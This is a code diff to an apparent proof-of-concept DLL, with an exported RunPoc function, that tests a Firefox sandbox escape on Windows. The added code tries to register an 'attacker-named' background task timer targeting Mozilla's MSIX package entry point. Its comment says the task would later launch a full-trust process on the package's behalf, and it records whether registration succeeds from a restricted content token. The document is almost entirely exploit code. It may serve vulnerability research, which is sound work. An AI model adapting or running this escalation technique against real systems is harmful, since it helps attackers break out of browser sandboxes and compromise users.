@@ -3,6 +3,7 @@
 #include <appmodel.h>
 #include <roapi.h>
 #include <winrt/Windows.ApplicationModel.h>
+#include <winrt/Windows.ApplicationModel.Background.h>
 #include <winrt/Windows.Foundation.h>
 #include <winrt/base.h>
 
@@ -87,6 +88,8 @@ extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
   context->call_hresult = E_PENDING;
   context->extended_error = S_OK;
   context->launch_result = -1;
+  context->background_register_hresult = E_PENDING;
+  context->background_registered = FALSE;
   CaptureCurrentProcess(context->caller);
 
   const HRESULT initialize_result = RoInitialize(RO_INIT_MULTITHREADED);
@@ -110,6 +113,28 @@ extern "C" __declspec(dllexport) DWORD WINAPI RunPoc(void* raw_context) {
     context->call_hresult = error.code().value;
   } catch (...) {
     context->call_hresult = E_FAIL;
+  }
+
+  // The direct launch is expected to be denied for a Firefox content token.
+  // Test the separate package background-task route introduced by the same
+  // autoland commit: if this restricted caller can register an attacker-named
+  // timer, Windows will later activate Mozilla's declared AppContainer entry
+  // point, which calls FullTrustProcessLauncher on the package's behalf.
+  if (context->background_task_name[0] != L'\0') {
+    try {
+      using namespace winrt::Windows::ApplicationModel::Background;
+      BackgroundTaskBuilder builder;
+      builder.Name(context->background_task_name);
+      builder.TaskEntryPoint(L"Mozilla.MsixComServer.BackgroundTaskHost");
+      builder.SetTrigger(TimeTrigger(15, true));
+      const auto registration = builder.Register();
+      context->background_registered = static_cast<bool>(registration);
+      context->background_register_hresult = S_OK;
+    } catch (const winrt::hresult_error& error) {
+      context->background_register_hresult = error.code().value;
+    } catch (...) {
+      context->background_register_hresult = E_FAIL;
+    }
   }
 
   if (should_uninitialize) {
